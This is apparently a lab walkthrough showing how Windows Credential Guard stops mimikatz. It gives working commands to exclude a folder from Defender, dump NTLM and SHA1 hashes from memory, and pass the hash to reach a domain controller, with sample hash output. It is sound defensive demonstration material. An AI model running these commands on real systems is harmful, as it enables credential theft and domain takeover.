# Credential Guard Demo with Mimikatz

## Demo without Credential Guard enabled

If you have a VM with Credential Guard already enabled, run the following command on the Hyper-V host to disable Virtualization based Security.

```powershell
Set-VMSecurity -VMName "W10Client1 - Hybrid Joined" -VirtualizationBasedSecurityOptOut $false
```

1. Add C:\DEV\MK to the Defender Exclusion list
2. Download mimikatz into C:\DEV\MK
3. Open an elevated prompt.
4. Run mimikatz.exe
5. Run the following commands

```batch
privilege::debug
log nocredguard.log
sekurlsa::logonpasswords
```

You get an output like this, in this example we see the NTLM hashes from user Tina and user OA. Note down the NTLM hash

```batch
         * Username : oa
         * Domain   : corp
         * NTLM     : 63bf41b93e6ee0deffbadba689a0241d
         * SHA1     : 00b18eac52e67f636fc4a1130f491919a2516ce3
         * DPAPI    : 06383a0cd1b82e49154d37c70c70d85b


         * Username : tina
         * Domain   : corp
         * NTLM     : 3c849ce9c31ccf7a3c0cad3ec93edc75
         * SHA1     : dc4aa8063574c5069ed522d8098e0b9ab1fab3bf
         * DPAPI    : 131a0e8007dbed59aa34bf15e0269e03

```

To run a Pass the hash simulation run the following command:

```batch
sekurlsa::pth    /user:oa  /domain:corp.net /ntlm:63bf41b93e6ee0deffbadba689a0241d
```

Run whoami, you will still see the test user, not the elevated one, next open a remote powershell session on the domain controller and add a new group. This only works because you  are using domain admin credentials via pass the hash


## Demo with Credential Guard enabled

To turn VBS on again for the VM that has Credential Gaurd enabled run the following command on the Hyper-V host. 

```powershell
Set-VMSecurity -VMName "W10Client1 - Hybrid Joined" -VirtualizationBasedSecurityOptOut $true
```

Then logon to the VM , open an elevated prompt and run the following command:

1. Run mimikatz.exe
2. Run the following commands

```batch
privilege::debug
log nocredguard.log
sekurlsa::logonpasswords
```

Result: you will no longer see MTLM hashes.
